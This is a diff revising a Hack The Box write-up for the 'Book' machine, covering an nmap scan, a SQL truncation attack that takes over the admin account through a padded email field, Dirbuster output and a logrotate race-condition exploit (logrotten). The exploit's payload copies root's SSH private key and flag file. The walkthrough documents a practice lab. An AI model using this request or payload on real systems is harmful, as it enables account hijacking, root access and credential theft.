@@ -14,7 +14,7 @@ Useful tool or skill 1
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<ip>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `10.10.10.176`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
 zweilos@kalimaa:~/htb/book$ nmap -p- -sC -sV -oN book.nmap 10.10.10.176
@@ -42,9 +42,11 @@ Nmap done: 1 IP address (1 host up) scanned in 8272.93 seconds
 
 only two ports opn, 22 -ssh and 80 - http, nothing to do except check to see what is hosted on port 80.
 
-navigating to 10.10.10.176 leads to a login page. Peaking at the source code of the page shows an interesting script embedded in the html.
+![](../.gitbook/assets/2-login-page.png)
 
-```text
+I navigated to `http://10.10.10.176`  which led to a login page. Peaking at the source code of the page revealed an interesting script embedded in the html.
+
+```javascript
 <script>
   window.console = window.console || function(t) {};
 </script>
@@ -67,22 +69,47 @@ function validateForm() {
 </script>
 ```
 
-[https://resources.infosecinstitute.com/sql-truncation-attack/\#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)
+### SQL Truncate attack
 
-```text
-How the select query works:
-Before passing data to the ‘insert’ query, the ‘select’ query matches the username with the previous entries to reveal any redundant entries. As the username we entered is ‘admin          1’ the select query will not find any similar entry and pass the data to the insert query to do its job.
+I had to do quite a bit of reading before I found something that gave me any information to exploiting this.  Essentially the problem boils down to a timing issue between checking the database for an existing user, and the default configuration for MySQL, which truncates strings that are entered.  So, when a user inputs a username \(which in this case is the `email` field\), the code with compare the inputted string against the list of users to see if it already exists or not.  If not, it will enter it into the database, truncating the string down to the maximum length.  
 
-How 'insert' query stores data.
-Talking about mysql, all strings are truncated before being stored in the database. Also, there is a length restriction of 16 characters. So, ‘admin           1’ (17 Characters) will be cut to 16 characters by removing the last digit. After passing the validation, the username is ‘admin           ‘ which will be stored as ‘admin’ because of truncation.
+In this case, the script tells us that the admin has modified this truncation to be 10 characters for `name` and 20 characters for `email`.  In addition, MySQL removes any trailing whitespace when adding entries, which gives us a perfect attack avenue. More information can be found at: [https://resources.infosecinstitute.com/sql-truncation-attack/\#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)
 
-How the select query fetches.
-When we try to login with username = ‘admin’  and the password that we created, the select query successfully finds this pair and lets us login with admin privileges.
-```
+![](../.gitbook/assets/3-register.png)
 
-admin@book.htb - gained from contact page; trying to use burp to guess password on /admin/index.php doesnt work
+Unfortunately, I did not currently have any valid usernames to do this attack against, so I created a random user account and logged in.  
 
-forgot password doesnt work Attacking the Sign up page using Sql Truncate
+![](../.gitbook/assets/3-loggedin.png)
+
+![](../.gitbook/assets/screenshot_2020-06-07_10-46-22.png)
+
+I found what I was looking for on the `Contact us` page.  The email address `admin@book.htb` was most likely the email address for logging into the Admin account.   
+
+![](../.gitbook/assets/6-admin-fail.png)
+
+I first tried some basic passwords to log in, but just got this message.
+
+![](../.gitbook/assets/7-nope.png)
+
+### Attacking the Sign up page using SQL Truncate
+
+Next I tried creating an admin account using the information I had gained from reading about SQL truncation.  
+
+![](../.gitbook/assets/8-admin-create.png)
+
+Trying to \(re\)create the admin account without using SQL truncate results in the following alert message:
+
+![](../.gitbook/assets/9-admin-exists.png)
+
+Next I tried doing the attack by putting a lot of spaces and a the word 'test' after the email address so that it was well past the 20 character maximum.  
+
+![](../.gitbook/assets/10-new-admin-deny.png)
+
+Unfortunately it gave an error, saying `A part following '@' should not contain the symbol ' '.`. \(This was in Chromium\).  I tried it again in Firefox, but it also did not seem to work and just gave an unspecified "Please enter an email address" error.  Next I fired up Burp and captured my POST request to do some troubleshooting.  I sent the request to Repeater so I could easily recreate and modify it as needed.  
+
+![](../.gitbook/assets/10-new-admin-pass.png)
+
+I sent the same exact request using Burp and to my surprise it went through.  I'm guessing that the browsers themselves were doing some form validation in order to prevent attacks of this sort.
 
 ```text
 POST /index.php HTTP/1.1
@@ -99,12 +126,22 @@ Cookie: PHPSESSID=630fii00brfacrkgee7jom2p4d
 Upgrade-Insecure-Requests: 1
 DNT: 1
 
-name=admin&email=admin%40book.htb                                    test&password=admin!!!
+name=admin&email=admin%40book.htb                                    test&password=!AmA$up3r@dmin!!!
 ```
 
-form will only accept input of a certain length, everything else is truncated. Was able to change admin logon with this by registering a new user named admin, admin.book.htb with spaces, and a password. Seemingly I had hit a dead end.
+Thinking that my password choice had perhaps been a bit too weak, I went back and used `!AmA$up3r@dmin!!!` as a password rather than something super-overly-simplistic in order to prevent other users from accidentally stumbling upon the admin account without learning anything about the proper attack. 
+
+![](../.gitbook/assets/11.5-signedin-admin.png)
+
+I then logged in using my shiny new admin password, and started looking around.  Nothing seemed to be different other than the account I was logged in as.  
+
+![](../.gitbook/assets/12-submission.png)
+
+I played around with sending different payloads in the collections submission form, but could not find a way to execute any type of code I sent.  This message was the same as when I uploaded files as my basic user account.  Seemingly I had hit a dead end.
 
 ## Enumeration with Dirbuster
+
+I decided to check my Dirbuster output to see if there were any useful hidden pages.
 
 ```text
 DirBuster 1.0-RC1 - Report
@@ -158,7 +195,15 @@ Files found with a 200 responce:
 --------------------------------
 ```
 
-I checked the progress of my Dirbuster scan, and was pleasantly surprised to see some an `/admin/index.php` page listed. I tried using my new admin credentials I had created and logged in.
+I was pleasantly surprised to see an `/admin/index.php` page listed. 
+
+![](../.gitbook/assets/14-admin-only.png)
+
+At first I tried to see if the "Forgot your password?" link would do anything, but it wasn't linked to anything and doesn't work.  I tried using my new admin credentials I had created and logged in.  
+
+![](../.gitbook/assets/15-real-adminpage.png)
+
+Thankfully, the Administrator panel had some new options.  
 
 ## Initial Foothold
 
@@ -341,15 +386,54 @@ linpeas.sh also told me that there were writable log files in `reader`'s home di
 
 > There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location. If logrotate is being executed by root, then the user will be able to write any file in `/etc/bash_completion.d/` that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder, you can privesc \(on most linux distributions, logrotate is executed automatically once a day as user root\). Also, check if apart of `/var/log` there are more files being rotated. More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition). You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).
 
-From the exploit writer:
+From the exploit writer at [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten):
 
-> ### Precondition for privilege escalation
+> #### Precondition for privilege escalation
 >
 > * [x] Logrotate has to be executed as root
 > * [x] The logpath needs to be in control of the attacker
 > * [x] Any option that creates files is set in the logrotate configuration
+>
+> #### To run the exploit:
+>
+> If "create"-option is set in logrotate.cfg:
+>
+> ```text
+> ./logrotten -p ./payloadfile /tmp/log/pwnme.log
+> ```
+>
+> If "compress"-option is set in logrotate.cfg:
+>
+> ```text
+> ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
+> ```
 
-Based on my enumeration I found that these conditions were met, so I went ahead and created a payload for this exploit, and ran it.
+Inside `/etc/logrotate.conf` I found that the "create" option had been set
+
+```text
+# see "man logrotate" for details
+# rotate log files weekly
+weekly
+
+# use the syslog group by default, since this is the owning group
+# of /var/log/syslog.
+su root syslog
+
+# keep 4 weeks worth of backlogs
+rotate 4
+
+# create new (empty) log files after rotating old ones
+create
+
+# uncomment this if you want your log files compressed
+#compress
+
+# packages drop log rotation information into this directory
+include /etc/logrotate.d
+
+```
+
+Based on my enumeration I found that all of the conditions for vulnerability to this exploit were met, except for one thing.  I could not find any configuration files related to `logrotate` that mentioned `access.log` in the `/home/reader/backups` folder.  I decided to go ahead  and try it anyway since it looked like a likely approach.  I created a payload that would get me root access, and ran the exploit.
 
 ```text
 reader@book:/dev/shm$ ./logrotten -p ./payload /home/reader/backups/access.log
@@ -367,7 +451,7 @@ My payload was designed to exfiltrate both `root.txt` and `root`'s SSH key.
 /bin/cat /root/.ssh/id_rsa > /dev/shm/test2
 ```
 
-In order to execute my script, I had to force log rotation by writing to the log a valid entry.  I simply copied the valid entry from the backup in the same folder:
+However, just running the exploit was not enough.  In order to execute my script, I had to force log rotation by writing to the log a valid entry.  I simply copied the valid entry from the backup in the same folder:
 
 ```text
 reader@book:~/backups$ cat access.log.1
@@ -447,6 +531,28 @@ uid=0(root) gid=0(root) groups=0(root)
 book
 root@book:~#
 ```
+
+## Solving the logrotate mystery
+
+After gaining root access I found out why I was unable to find out what was causing the logs in `/home/reader/backups` to be rotated.  In the `/root` directory there were some files for cleaning up the system of other user's artifacts, and also the script and config that rotated `access.log` in the `backup/` folder.  
+
+```text
+root@book:~# cat log.sh
+#!/bin/sh
+/usr/sbin/logrotate -f /root/log.cfg
+
+root@book:~# cat log.cfg 
+/home/reader/backups/access.log {
+        daily
+        rotate 12
+        missingok
+        notifempty
+        size 1k
+        create
+}
+```
+
+Mystery solved!
 
 Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) for &lt;something interesting or useful about this machine.
 
